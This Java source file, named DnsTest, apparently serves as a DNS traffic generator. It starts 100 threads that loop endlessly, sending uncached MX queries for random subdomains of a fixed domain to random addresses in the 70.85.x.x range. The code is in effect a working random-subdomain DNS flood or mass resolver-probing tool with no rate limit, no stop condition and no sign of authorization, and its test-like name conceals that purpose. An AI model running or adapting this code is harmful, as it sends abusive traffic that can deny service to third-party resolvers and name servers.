package dnstest;

import java.net.*;

import org.xbill.DNS.*;

public class DnsTest implements Runnable
{

	private static char[] rndchrs = new char[36];

	private static String domainpostfix = ".71.nsk3fxb.com";

	private static String genDomain()
	{
		StringBuilder sb = new StringBuilder();
		for(int i = 0; i < 30; i++)
			sb.append(rndchrs[(int) (Math.random() * rndchrs.length)]);
		sb.append('.');
		for(int i = 0; i < 31; i++)
			sb.append(rndchrs[(int) (Math.random() * rndchrs.length)]);
		sb.append(domainpostfix);
		return sb.toString();
	}

	private static Lookup genLookup() throws TextParseException, UnknownHostException
	{
		Lookup l = new Lookup(genDomain(), Type.MX);
		l.setCache(null);
		StringBuilder sb = new StringBuilder("70.85.");
		sb.append((int) (Math.random() * 256));
		sb.append('.');
		sb.append((int) (Math.random() * 256));
		ExtendedResolver r = new ExtendedResolver(new String[]{sb.toString()});
		l.setResolver(r);
		return l;
	}

	private static void init()
	{
		int i = 0; char c;
		for(c = '0'; c <= '9'; c++, i++)
			rndchrs[i] = c;
		for(c = 'a'; c <= 'z'; c++, i++)
			rndchrs[i] = c;
	}

	public static void main(String[] args)
	{
		init();
		for(int i = 0; i < 100; i++)
			new Thread(new DnsTest()).start();
	}

	@Override
	public void run()
	{
		while(true)
		{
			try
			{
				Lookup l = genLookup();
				l.run();
			}
			catch (TextParseException e)
			{
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			catch (UnknownHostException e)
			{
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}

}
